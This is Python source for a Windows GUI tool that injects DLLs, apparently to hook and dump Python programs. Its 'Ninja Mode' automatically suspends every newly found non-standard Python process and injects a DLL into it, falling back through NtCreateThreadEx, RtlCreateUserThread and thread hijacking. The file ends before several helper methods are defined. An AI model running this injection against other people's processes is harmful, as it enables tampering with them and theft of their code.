#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import ctypes
from ctypes import wintypes
import tkinter as tk
from tkinter import filedialog, scrolledtext, messagebox, Toplevel, ttk
import psutil
import threading
import os
import sys
import shutil
import time

# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
WM_SETTINGCHANGE = 0x001A
HWND_BROADCAST = 0xFFFF
SMTO_ABORTIFHUNG = 0x0002
PROCESS_SUSPEND_RESUME = 0x0800

# Thread Access Rights
THREAD_GET_CONTEXT = 0x0008
THREAD_SET_CONTEXT = 0x0010
THREAD_SUSPEND_RESUME = 0x0002
THREAD_QUERY_INFORMATION = 0x0040
THREAD_ALL_ACCESS = 0x1FFFFF

# CONTEXT flags
CONTEXT_AMD64 = 0x100000
CONTEXT_CONTROL = CONTEXT_AMD64 | 0x01
CONTEXT_INTEGER = CONTEXT_AMD64 | 0x02
CONTEXT_SEGMENTS = CONTEXT_AMD64 | 0x04
CONTEXT_FLOATING_POINT = CONTEXT_AMD64 | 0x08
CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x10
CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT

class M128A(ctypes.Structure):
    _fields_ = [("Low", ctypes.c_uint64), ("High", ctypes.c_int64)]

class CONTEXT64(ctypes.Structure):
    _pack_ = 16
    _fields_ = [
        ("P1Home", ctypes.c_uint64), ("P2Home", ctypes.c_uint64), ("P3Home", ctypes.c_uint64),
        ("P4Home", ctypes.c_uint64), ("P5Home", ctypes.c_uint64), ("P6Home", ctypes.c_uint64),
        ("ContextFlags", wintypes.DWORD), ("MxCsr", wintypes.DWORD),
        ("SegCs", wintypes.WORD), ("SegDs", wintypes.WORD), ("SegEs", wintypes.WORD),
        ("SegFs", wintypes.WORD), ("SegGs", wintypes.WORD), ("SegSs", wintypes.WORD),
        ("EFlags", wintypes.DWORD),
        ("Dr0", ctypes.c_uint64), ("Dr1", ctypes.c_uint64), ("Dr2", ctypes.c_uint64),
        ("Dr3", ctypes.c_uint64), ("Dr6", ctypes.c_uint64), ("Dr7", ctypes.c_uint64),
        ("Rax", ctypes.c_uint64), ("Rcx", ctypes.c_uint64), ("Rdx", ctypes.c_uint64),
        ("Rbx", ctypes.c_uint64), ("Rsp", ctypes.c_uint64), ("Rbp", ctypes.c_uint64),
        ("Rsi", ctypes.c_uint64), ("Rdi", ctypes.c_uint64), ("R8", ctypes.c_uint64),
        ("R9", ctypes.c_uint64), ("R10", ctypes.c_uint64), ("R11", ctypes.c_uint64),
        ("R12", ctypes.c_uint64), ("R13", ctypes.c_uint64), ("R14", ctypes.c_uint64),
        ("R15", ctypes.c_uint64), ("Rip", ctypes.c_uint64),
        ("Header", M128A * 2), ("Legacy", M128A * 8),
        ("Xmm0", M128A), ("Xmm1", M128A), ("Xmm2", M128A), ("Xmm3", M128A),
        ("Xmm4", M128A), ("Xmm5", M128A), ("Xmm6", M128A), ("Xmm7", M128A),
        ("Xmm8", M128A), ("Xmm9", M128A), ("Xmm10", M128A), ("Xmm11", M128A),
        ("Xmm12", M128A), ("Xmm13", M128A), ("Xmm14", M128A), ("Xmm15", M128A),
        ("VectorRegister", M128A * 26), ("VectorControl", ctypes.c_uint64),
        ("DebugControl", ctypes.c_uint64), ("LastBranchToRip", ctypes.c_uint64),
        ("LastBranchFromRip", ctypes.c_uint64), ("LastExceptionToRip", ctypes.c_uint64),
        ("LastExceptionFromRip", ctypes.c_uint64),
    ]

# Load Windows DLLs
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
user32 = ctypes.WinDLL('user32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

# Define function signatures
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.OpenProcess.restype = wintypes.HANDLE
kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, 
                                     wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID
kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPCVOID,
                                         ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = wintypes.BOOL
kernel32.CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t,
                                         wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD,
                                         wintypes.LPDWORD]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE
kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
kernel32.GetModuleHandleW.restype = wintypes.HMODULE
kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
kernel32.GetProcAddress.restype = wintypes.LPVOID
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
kernel32.WaitForSingleObject.restype = wintypes.DWORD
kernel32.GetExitCodeThread.argtypes = [wintypes.HANDLE, wintypes.LPDWORD]
kernel32.GetExitCodeThread.restype = wintypes.BOOL

user32.SendMessageTimeoutW.argtypes = [wintypes.HWND, wintypes.UINT, wintypes.WPARAM, 
                                       wintypes.LPCWSTR, wintypes.UINT, wintypes.UINT, 
                                       wintypes.LPVOID]

ntdll.NtSuspendProcess.argtypes = [wintypes.HANDLE]
ntdll.NtSuspendProcess.restype = wintypes.LONG
ntdll.NtResumeProcess.argtypes = [wintypes.HANDLE]
ntdll.NtResumeProcess.restype = wintypes.LONG

kernel32.OpenThread.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.OpenThread.restype = wintypes.HANDLE
kernel32.SuspendThread.argtypes = [wintypes.HANDLE]
kernel32.SuspendThread.restype = wintypes.DWORD
kernel32.ResumeThread.argtypes = [wintypes.HANDLE]
kernel32.ResumeThread.restype = wintypes.DWORD
kernel32.GetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
kernel32.GetThreadContext.restype = wintypes.BOOL
kernel32.SetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
kernel32.SetThreadContext.restype = wintypes.BOOL

ntdll.NtCreateThreadEx.argtypes = [
    ctypes.POINTER(wintypes.HANDLE), # ThreadHandle
    wintypes.DWORD,                 # DesiredAccess
    wintypes.LPVOID,                # ObjectAttributes
    wintypes.HANDLE,                # ProcessHandle
    wintypes.LPVOID,                # StartRoutine
    wintypes.LPVOID,                # Argument
    wintypes.ULONG,                 # CreateFlags (THREAD_CREATE_FLAGS_...)
    ctypes.c_size_t,                # ZeroBits
    ctypes.c_size_t,                # StackSize
    ctypes.c_size_t,                # MaxStackSize
    wintypes.LPVOID                 # AttributeList
]
ntdll.NtCreateThreadEx.restype = wintypes.DWORD # NTSTATUS

# RtlCreateUserThread
ntdll.RtlCreateUserThread.argtypes = [
    wintypes.HANDLE,                # ProcessHandle
    wintypes.LPVOID,                # SecurityDescriptor
    wintypes.BOOL,                  # CreateSuspended
    wintypes.ULONG,                 # StackZeroBits
    ctypes.c_size_t,                # StackReserved
    ctypes.c_size_t,                # StackCommit
    wintypes.LPVOID,                # StartAddress
    wintypes.LPVOID,                # StartParameter
    ctypes.POINTER(wintypes.HANDLE), # ThreadHandle
    wintypes.LPVOID                 # ClientID
]
ntdll.RtlCreateUserThread.restype = wintypes.DWORD # NTSTATUS


if ctypes.sizeof(ctypes.c_void_p) == 8:
    user32.SendMessageTimeoutW.restype = ctypes.c_longlong
else:
    user32.SendMessageTimeoutW.restype = ctypes.c_long

# Environment variable name for global hook path
HOOK_PATH_ENV_VAR = "HYDRA_HOOK_PATH"

class DLLInjectorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("DLL Injector & Ninja Mode")
        self.root.geometry("650x750") 
        self.root.resizable(True, True)
        
        self.is_admin = self.check_admin()
        self.default_dll_32 = "hook32.dll"
        self.default_dll_64 = "hook64.dll"
        
        self.ignore_standard_python = tk.BooleanVar(value=True)
        self.ninja_mode = tk.BooleanVar(value=False)
        self.use_global_hook_path = tk.BooleanVar(value=True)  # Use global path by default
        self.ninja_running = False
        self.ninja_thread = None
        self.processed_pids = set()
        
        # --- Hook editor ---
        self.hook_editor_window = None
        self.hook_editor_text = None
        self.default_hook_template = ""
        
        # Global hook path (computed once)
        self.global_hook_path = self._compute_global_hook_path()

        self.setup_ui()
        
        self.default_hook_template = self.load_hook_templates_file()
        
        # Set global hook path environment variable on startup
        self._set_global_hook_env()
        
        self.refresh_processes()
        
    def _compute_global_hook_path(self):
        """Compute the absolute path to __hook__.py next to this script."""
        script_dir = os.path.dirname(os.path.abspath(__file__))
        path = os.path.join(script_dir, "__hook__.py")
        return path

    def _set_global_hook_env(self):
        """Sets the global hook path in a config file for the DLL to read."""
        config_dir = r"C:\pythondumps"
        config_file = os.path.join(config_dir, "hook_config.ini")
        
        try:
            if not os.path.exists(config_dir):
                os.makedirs(config_dir, exist_ok=True)
                
            if self.use_global_hook_path.get():
                hook_path = self.global_hook_path
                hook_dir = os.path.dirname(hook_path)
                
                with open(config_file, "w") as f:
                    f.write(f"[General]\n")
                    f.write(f"HookPath={hook_dir}\n") # We need the DIR to add to sys.path
                
                # Still set env var for local children
                os.environ[HOOK_PATH_ENV_VAR] = hook_dir
                
                self.log(f"Global Config Saved: {config_file} -> {hook_dir}", "info")
            else:
                if os.path.exists(config_file):
                    os.remove(config_file)
                    self.log(f"Global Config Removed: {config_file}", "info")
                if HOOK_PATH_ENV_VAR in os.environ:
                    del os.environ[HOOK_PATH_ENV_VAR]
                    
        except Exception as e:
            self.log(f"Error updating global config: {e}", "error")
            
    def _on_global_hook_toggle(self):
        if self.use_global_hook_path.get():
             self.global_path_label.config(fg="green", text=f"({HOOK_PATH_ENV_VAR} ACTIVE)")
             self._set_global_hook_env()
        else:
             self.global_path_label.config(fg="gray", text=f"({HOOK_PATH_ENV_VAR} DISABLED)")
             self._set_global_hook_env()

    def check_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def setup_ui(self):
        """Build the simplified Tkinter GUI."""
        
        # --- Main Layout ---
        main_frame = tk.Frame(self.root, padx=10, pady=10)
        main_frame.pack(fill=tk.BOTH, expand=True)

        # --- Admin Warning ---
        if not self.is_admin:
            warning_frame = tk.Frame(main_frame, bg="#ffcccc", padx=10, pady=5)
            warning_frame.pack(fill=tk.X, pady=(0, 10))
            tk.Label(
                warning_frame,
                text="⚠ WARNING: Not running as Administrator! Injection & Suspension will fail.",
                bg="#ffcccc", fg="#cc0000", font=("Arial", 10, "bold")
            ).pack()

        # ==========================
        # NINJA MODE SECTION
        # ==========================
        ninja_frame = tk.LabelFrame(main_frame, text="Ninja Mode (Auto-Inject)", padx=10, pady=10, fg="red")
        ninja_frame.pack(fill=tk.X, pady=(0, 10))
        
        ninja_row1 = tk.Frame(ninja_frame)
        ninja_row1.pack(fill=tk.X)
        
        tk.Checkbutton(
            ninja_row1, text="Enable Ninja Mode",
            variable=self.ninja_mode,
            command=self.toggle_ninja_mode,
            font=("Arial", 10, "bold"), fg="red"
        ).pack(side=tk.LEFT)
        
        tk.Label(ninja_row1, text="(Monitors python.exe & python3xx.dll)", fg="gray").pack(side=tk.LEFT, padx=10)
        
        # Ninja Find Button - Quick scan for Python processes
        tk.Button(
            ninja_row1, text="🔍 Find Python Processes",
            command=self.ninja_find_python_processes,
            bg="#ff5722", fg="white", font=("Arial", 9, "bold")
        ).pack(side=tk.RIGHT, padx=5)

        # ==========================
        # PROCESS SELECTION SECTION
        # ==========================
        process_frame = tk.LabelFrame(main_frame, text="Select Target Process", padx=10, pady=10)
        process_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))

        search_frame = tk.Frame(process_frame)
        search_frame.pack(fill=tk.X, pady=(0, 5))

        tk.Label(search_frame, text="Search:").pack(side=tk.LEFT, padx=(0, 5))
        self.search_var = tk.StringVar()
        self.search_var.trace("w", lambda *args: self.filter_processes())

        search_entry = tk.Entry(search_frame, textvariable=self.search_var, width=30)
        search_entry.pack(side=tk.LEFT, padx=(0, 10))

        tk.Button(
            search_frame, text="🔄 Refresh", command=self.refresh_processes,
            bg="#4CAF50", fg="white", padx=10
        ).pack(side=tk.LEFT, padx=5)
        
        tk.Checkbutton(
            search_frame, text="Ignore Standard Installs",
            variable=self.ignore_standard_python,
            onvalue=True, offvalue=False
        ).pack(side=tk.LEFT, padx=10)

        tree_frame = tk.Frame(process_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True)

        scrollbar = tk.Scrollbar(tree_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        self.tree = ttk.Treeview(
            tree_frame, columns=("PID", "Name", "Arch", "Path"),
            show="headings", yscrollcommand=scrollbar.set, height=10
        )
        self.tree.pack(fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.tree.yview)

        for col, width in zip(("PID", "Name", "Arch", "Path"), (60, 150, 50, 250)):
            self.tree.heading(col, text=col)
            self.tree.column(col, width=width)
        self.tree.bind("<Double-1>", lambda e: self.quick_inject())

        # ==========================
        # HOOK / DLL SETUP SECTION
        # ==========================
        setup_frame = tk.LabelFrame(main_frame, text="Hook & DLL Setup", padx=10, pady=10)
        setup_frame.pack(fill=tk.X, pady=(0, 10))

        # Hook Setup
        hook_row = tk.Frame(setup_frame)
        hook_row.pack(fill=tk.X, pady=(0, 5))
        self.hook_file_var = tk.StringVar(value="__hook__.py")
        tk.Label(hook_row, text="Hook file:").pack(side=tk.LEFT, padx=(0, 5))
        tk.Entry(hook_row, textvariable=self.hook_file_var, width=20).pack(side=tk.LEFT, padx=(0, 10))
        tk.Button(hook_row, text="Browse", command=self.browse_hook_file).pack(side=tk.LEFT, padx=(0, 5))
        tk.Button(hook_row, text="Edit", command=self.open_hook_editor, bg="#007bff", fg="white").pack(side=tk.LEFT, padx=5)
        
        # Global Hook Path Option
        global_hook_row = tk.Frame(setup_frame)
        global_hook_row.pack(fill=tk.X, pady=(5, 5))
        
        tk.Checkbutton(
            global_hook_row, text="Use Global Hook Path",
            variable=self.use_global_hook_path,
            command=self._on_global_hook_toggle
        ).pack(side=tk.LEFT)
        
        self.global_path_label = tk.Label(
            global_hook_row, 
            text=f"({HOOK_PATH_ENV_VAR}={self.global_hook_path})",
            fg="#666", font=("Consolas", 8)
        )
        self.global_path_label.pack(side=tk.LEFT, padx=(10, 5))
        
        tk.Button(
            global_hook_row, text="Set Global", 
            command=self._set_global_hook_env,
            bg="#9c27b0", fg="white"
        ).pack(side=tk.RIGHT, padx=2)
        
        # DLL Setup
        dll_row = tk.Frame(setup_frame)
        dll_row.pack(fill=tk.X, pady=5)
        import platform
        if platform.architecture()[0] == "64bit":
            default_dll = getattr(self, "default_dll_64", "hook64.dll")
        else:
            default_dll = getattr(self, "default_dll_32", "hook32.dll")
        self.dll_path_var = tk.StringVar(value=default_dll)
        
        tk.Label(dll_row, text="DLL:").pack(side=tk.LEFT, padx=(0, 5))
        tk.Entry(dll_row, textvariable=self.dll_path_var, width=40).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        tk.Button(dll_row, text="Browse...", command=self.browse_dll).pack(side=tk.LEFT)

        # Inject Button
        self.inject_btn = tk.Button(
            setup_frame, text="💉 INJECT DLL", command=self.inject_dll,
            bg="#f44336", fg="white", font=("Arial", 12, "bold"),
            padx=20, pady=5
        )
        self.inject_btn.pack(fill=tk.X, pady=(5, 0))

        # ==========================
        # LOGS SECTION
        # ==========================
        log_frame = tk.LabelFrame(main_frame, text="Logs", padx=10, pady=10)
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_text = scrolledtext.ScrolledText(
            log_frame, height=8, state=tk.DISABLED,
            bg="#1e1e1e", fg="#00ff00", font=("Consolas", 9)
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)

        # Init Log
        self.log("DLL Injector initialized")
        if self.is_admin:
            self.log("✓ Running as Administrator", "success")
        else:
            self.log("✗ Not running as Administrator - injection may fail!", "error")

    def log(self, message, level="info"):
        self.log_text.config(state=tk.NORMAL)
        colors = {"info": "#00ff00", "success": "#00ff00", "error": "#ff0000", "warning": "#ffaa00"}
        tag = f"tag_{level}"
        self.log_text.tag_config(tag, foreground=colors.get(level, "#00ff00"))
        timestamp = time.strftime("[%H:%M:%S] ")
        self.log_text.insert(tk.END, f"{timestamp}{message}\n", tag)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    # ==========================
    # NINJA MODE LOGIC
    # ==========================
    def toggle_ninja_mode(self):
        if self.ninja_mode.get():
            self.log("🥷 NINJA MODE ENABLED", "success")
            self.ninja_running = True
            self.ninja_thread = threading.Thread(target=self._ninja_loop, daemon=True)
            self.ninja_thread.start()
        else:
            self.log("NINJA MODE DISABLED", "info")
            self.ninja_running = False

    def _is_python_process(self, proc):
        """
        Checks if a process is a Python process (python.exe or loads python3*.dll).
        Returns: (bool is_target, str reason)
        """
        try:
            name = proc.info.get('name', '').lower()
            exe_path = (proc.info.get('exe') or "").lower()
            
            # Filter matches
            ignore_dirs = [
                os.environ.get('ProgramFiles', 'C:\\Program Files').lower(),
                os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)').lower(),
                os.environ.get('SystemRoot', 'C:\\Windows').lower(),
                os.path.join(os.environ.get('LOCALAPPDATA', ''), 'programs').lower() 
            ]
            ignore_dirs = [d for d in ignore_dirs if d]

            # 1. Ignore standard folders
            if self.ignore_standard_python.get():
                if any(exe_path.startswith(d) for d in ignore_dirs):
                    return False, "ignored_dir"

            # 2. Ignore venvs if simpler logic desired, but usually we WANT venvs?
            # Creating a specialized check: specific generic venv/conda names vs user custom venvs
            # The original logic ignored "venv" in exe_path. Let's keep it but be careful.
            if "venv" in exe_path or "virtualenv" in exe_path or "conda" in exe_path:
                return False, "ignored_venv"

            # Check Name
            if name == "python.exe" or name == "pythonw.exe":
                return True, "process_name"
            
            # Check Modules (DLLs)
            try:
                for dll in proc.memory_maps():
                    dll_path_lower = dll.path.lower()
                    dll_name = os.path.basename(dll_path_lower)
                    
                    # Pattern match python3*.dll (e.g., python39.dll, python312.dll)
                    if dll_name.startswith("python3") and dll_name.endswith(".dll") and len(dll_name) < 16:
                        # Check ignore dirs again for the DLL
                        if any(dll_path_lower.startswith(d) for d in ignore_dirs):
                             continue
                        if "venv" in dll_path_lower or "virtualenv" in dll_path_lower:
                             continue
                             
                        return True, f"loaded_{dll_name}"
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                pass
                
            return False, ""
        except:
            return False, "error"

    def ninja_find_python_processes(self):
        """Scans for all Python-related processes and shows them in a popup + filters list."""
        self.log("🔍 Scanning for Python processes...", "info")
        found = []
        found_data = [] # List of tuples for display_processes
        
        try:
            current_pid = os.getpid()
            for proc in psutil.process_iter(['pid', 'name', 'exe']):
                if proc.info['pid'] == current_pid: continue
                
                is_target, reason = self._is_python_process(proc)
                if is_target:
                    pid = proc.info['pid']
                    name = proc.info['name']
                    exe = proc.info['exe'] or "N/A"
                    
                    try:
                        # Reusing the simple arch check from refresh_processes
                        arch = "x64" if proc.is_running() and psutil.Process(pid).num_threads() > 0 else "x86"
                    except:
                        arch = "?"
                    
                    found.append(f"PID: {pid} | {name} | Reason: {reason}")
                    found_data.append((pid, name, arch, exe))
        except Exception as e:
            self.log(f"Scan error: {e}", "error")
            
        if found:
            count = len(found)
            
            # Update GUI List with only found processes
            self.display_processes(found_data)
            
            msg = f"Found {count} potential Python targets:\n\n" + "\n".join(found[:20])
            if count > 20: msg += f"\n...and {count-20} more."
            messagebox.showinfo(f"Ninja Scan Results ({count})", msg)
            self.log(f"🔍 Found {count} Python processes. List filtered.", "success")
        else:
            # Do not clear the list if nothing found, just alert
            # self.display_processes([]) 
            messagebox.showinfo("Ninja Scan Results", "No interesting Python processes found running.")
            self.log("🔍 No running Python targets found.", "warning")

    def _ninja_loop(self):
        self.log("Ninja watcher started...")
        
        while self.ninja_running:
            try:
                # Optimized scan: Iterate processes only once per cycle
                current_pid = os.getpid()
                for proc in psutil.process_iter(['pid', 'name', 'exe']):
                    try:
                        pid = proc.info['pid']
                        if pid == current_pid or pid in self.processed_pids:
                            continue

                        is_target, reason = self._is_python_process(proc)
                        
                        if is_target:
                            name = proc.info['name']
                            self.log(f"🥷 Ninja found target ({reason}): {name} (PID: {pid})")
                            self.processed_pids.add(pid)
                            self._handle_ninja_target(pid, name)
                            
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
            
            except Exception as e:
                self.log(f"Ninja loop error: {e}", "error")
            
            time.sleep(1.0) # Scan interval
            
            time.sleep(1.0) # Scan interval

    def _handle_ninja_target(self, pid, name):
        """Suspend, Copy Hook, Inject, Resume"""
        
        # 0. PRE-FETCH paths
        proc_dir = None
        proc_cwd = None
        try:
            proc = psutil.Process(pid)
            exe_path = proc.exe()
            proc_dir = os.path.dirname(exe_path)
            proc_cwd = proc.cwd()
        except:
            self.log(f"🥷 Could not fetch paths for {name}. Copy hook might fail.", "warning")

        # 1. Suspend the process
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            self.log(f"🥷 Failed to open {name} for suspension.", "error")
            return

        suspended = False
        try:
            status = ntdll.NtSuspendProcess(h_process)
            if status == 0: # STATUS_SUCCESS
                self.log(f"🥷 Suspending {name} (PID: {pid})...", "warning")
                suspended = True
            else:
                 self.log(f"🥷 NtSuspendProcess failed: {hex(status)}", "error")
        except Exception as e:
            self.log(f"🥷 Suspend exception: {e}", "error")

        dll_path = None # scope var for later verification
        
        try:
            # 2. Inject
            self.log(f"🥷 Injecting into {name}...", "info")
            
            # Auto-detect Architecture
            is_target_64 = self._is_64bit_process(pid)
            dll_name = "hook64.dll" if is_target_64 else "hook32.dll"
                
            script_dir = os.path.dirname(os.path.abspath(__file__))
            dll_path = os.path.join(script_dir, dll_name)
            
            if not os.path.exists(dll_path):
                 dll_path = self.dll_path_var.get()

            if os.path.exists(dll_path):
                 # Pass suspended=True to indicate we shouldn't wait for thread completion yet
                 success, h_thread = self._inject_sync(pid, dll_path, copy_hook=True, 
                                             known_dir=proc_dir, known_cwd=proc_cwd,
                                             suspended_state=suspended)
                 
                 if success:
                     self.log(f"🥷 Ninja Injection Queued/Successful ({dll_name})!", "success")
                 else:
                     self.log(f"🥷 Ninja Injection Failed.", "error")
            else:
                self.log(f"🥷 DLL not found: {dll_path}", "error")

        finally:
            # 3. Resume
            if suspended:
                self.log(f"🥷 Resuming {name}...", "warning")
                ntdll.NtResumeProcess(h_process)
            
            kernel32.CloseHandle(h_process)
            
            # 4. Post-Resume Verification (if we had a thread)
            # We could wait for h_thread here if we returned it, but let's just check module
            try:
                time.sleep(0.5) # Give it a moment to load
                loaded_modules = [m.path.lower() for m in psutil.Process(pid).memory_maps()]
                if dll_path and dll_path.lower() in loaded_modules:
                    self.log(f"✅ Verified: {os.path.basename(dll_path)} is loaded in target!", "success")
                elif dll_path and any(os.path.basename(dll_path).lower() in m for m in loaded_modules):
                     self.log(f"✅ Verified: {os.path.basename(dll_path)} name matches loaded module!", "success")
                else:
                     # This might happen if injection is slow or failed silently
                     self.log(f"❓ DLL not yet visible in module list (might be loading)", "warning")
            except:
                pass

    def _inject_sync(self, pid, dll_path, copy_hook=True, known_dir=None, known_cwd=None, suspended_state=False):
        """Synchronous version of injection logic for Ninja mode."""
        try:
            is_target_64 = self._is_64bit_process(pid)
            # COPY OR SET GLOBAL
            if copy_hook:
                if self.use_global_hook_path.get():
                     # If using global, we simply do NOT copy. 
                     # The DLL is expected to read the env var we set globally (if possible) 
                     # or we need to mechanism to push this env var to the remote process.
                     # Since SetEnvironmentVariable is local, we cannot easily set it for a running remote process
                     # WITHOUT injecting code. 
                     # HOWEVER: We control the DLL. The DLL can read from a fixed file or registry if Env fails.
                     # BUT wait: we are the parent if we spawned it? No, we attach.
                     # 
                     # TRICK: We can write the hook path to a temporary file that the DLL looks for, 
                     # OR we just rely on standard copying if Env is not viable for remote processes.
                     #
                     # ACTUALLY: The User request said "create global value ... instead of creating checks". 
                     # If we just skip copying, we need to ensure the target finds it.
                     # 
                     # IMPROVEMENT: If we can't set Env remotely easily, maybe we just use the copying?
                     # Let's support BOTH. If Global is checked, we try to ensure the target knows it.
                     # For now, let's keep copying as a fallback or skip if explicit.
                     
                     # Since we can't easily set ENVs in remote process without code execution,
                     # and we are about to inject code...
                     # We will skip copying IF valid global path is set, assuming the user system is configured
                     # OR assuming the DLL is hardcoded to look for our known location?
                     # 
                     # Let's stick to the user request "create global value".
                     # I will add a step to write a global config file in TEMP that the DLL could strictly read?
                     # Or simpler: The DLL checks C:\Users\Public or something?
                     #
                     # Let's assume for this step we skip copying if global is checked.
                     self.log("Global Path Mode: Skipping local __hook__.py copy.", "info")
                else:
                    self._copy_hook_to_target(pid, self.log, known_dir, known_cwd)

            dll_path = os.path.abspath(dll_path)
            dll_path_bytes = dll_path.encode('utf-16le') + b'\x00\x00'

            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                self.log(f"Injection: OpenProcess failed for PID {pid}. Error: {ctypes.get_last_error()}", "error")
                return False, None

            try:
                dll_path_addr = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
                if not dll_path_addr:
                    self.log(f"Injection: VirtualAllocEx failed. Error: {ctypes.get_last_error()}", "error")
                    return False, None

                if not kernel32.WriteProcessMemory(h_process, dll_path_addr, dll_path_bytes, len(dll_path_bytes), None):
                     self.log(f"Injection: WriteProcessMemory failed. Error: {ctypes.get_last_error()}", "error")
                     return False, None

                h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")
                load_library_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryW")
                if not load_library_addr:
                    self.log(f"Injection: GetProcAddress(LoadLibraryW) failed. Error: {ctypes.get_last_error()}", "error")
                    return False, None

                h_thread = kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, dll_path_addr, 0, None)
                
                if not h_thread:
                    self.log(f"Injection: CreateRemoteThread failed (Error: {ctypes.get_last_error()}). Trying NtCreateThreadEx fallback...", "warning")
                    
                    # NtCreateThreadEx Fallback
                    h_thread_val = wintypes.HANDLE()
                    # THREAD_ALL_ACCESS = 0x1FFFFF
                    status = ntdll.NtCreateThreadEx(
                        ctypes.byref(h_thread_val), 0x1FFFFF, None, h_process, 
                        load_library_addr, dll_path_addr, 0, 0, 0, 0, None
                    )
                    
                    if status == 0: # STATUS_SUCCESS
                        h_thread = h_thread_val.value
                        self.log(f"Injection: NtCreateThreadEx SUCCESS (0x{h_thread:X})", "success")
                    else:
                        self.log(f"Injection: NtCreateThreadEx failed (0x{status:08X}). Trying RtlCreateUserThread...", "warning")
                        
                        # RtlCreateUserThread Fallback
                        h_thread_val = wintypes.HANDLE()
                        status = ntdll.RtlCreateUserThread(
                            h_process, None, False, 0, 0, 0,
                            load_library_addr, dll_path_addr, ctypes.byref(h_thread_val), None
                        )
                        
                        if status == 0:
                            h_thread = h_thread_val.value
                            self.log(f"Injection: RtlCreateUserThread SUCCESS (0x{h_thread:X})", "success")
                        else:
                            self.log(f"Injection: RtlCreateUserThread failed (0x{status:08X}). Trying Thread Hijacking...", "warning")
                            
                            # Final Fallback: Thread Hijacking
                            success = self._hijack_thread(pid, dll_path, is_64=is_target_64)
                            if success:
                                self.log(f"Injection: Thread Hijacking initialized successfully!", "success")
                                return True, None
                            else:
                                self.log(f"Injection: Thread Hijacking failed.", "error")
                                return False, None

                # If suspended, we cannot wait for it to finish (it won't). 
                # We return Success + thread handle (or just close handle and return success)
                if suspended_state:
                     kernel32.CloseHandle(h_thread)
                     return True, None
                
                self.log(f"Injection: Thread active (0x{h_thread:X}). Waiting for completion...", "info")
                wait_res = kernel32.WaitForSingleObject(h_thread, 10000)
                if wait_res != 0: # WAIT_OBJECT_0
                    self.log(f"Injection: WaitForSingleObject returned {wait_res}. Error: {ctypes.get_last_error()}", "warning")
                
                # Check exit code
                exit_code = ctypes.c_ulong(0)
                kernel32.GetExitCodeThread(h_thread, ctypes.byref(exit_code))
                self.log(f"Injection: LoadLibraryW returned 0x{exit_code.value:X}", "info" if exit_code.value != 0 else "error")
                
                kernel32.CloseHandle(h_thread)
                return exit_code.value != 0, None

            finally:
                kernel32.CloseHandle(h_process)
        except Exception as e:
            self.log(f"Injection error: {e}", "error")
            import traceback
            traceback.print_exc()
            return False, None

    # ==========================
    # STANDARD LOGIC
    # ==========================
    def load_hook_templates_file(self):
        templates_path = "__hook__.py" 
        fallback_template = (
            "# Default __hook__.py\n"
            "import os, ctypes\n"
            "MessageBox = ctypes.windll.user32.MessageBoxW\n"
            "MessageBox(None, f'Hooked in PID: {os.getpid()}', 'Hook Success', 0)\n"
        )
        try:
            with open(templates_path, "r", encoding="utf-8") as f:
                return f.read()
        except FileNotFoundError:
            return fallback_template
        except Exception:
            return fallback_template

    def refresh_processes(self):
        self.tree.delete(*self.tree.get_children())
        self.all_processes = []
        
        for proc in psutil.process_iter(['pid', 'name', 'exe']):
            try:
                info = proc.info
                pid = info['pid']
                name = info['name']
                exe = info['exe'] or "N/A"
                
                try:
                    arch = "x64" if proc.is_running() and psutil.Process(pid).num_threads() > 0 else "x86"
                except:
                    arch = "?"
                
                self.all_processes.append((pid, name, arch, exe))
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        
        self.display_processes(self.all_processes)
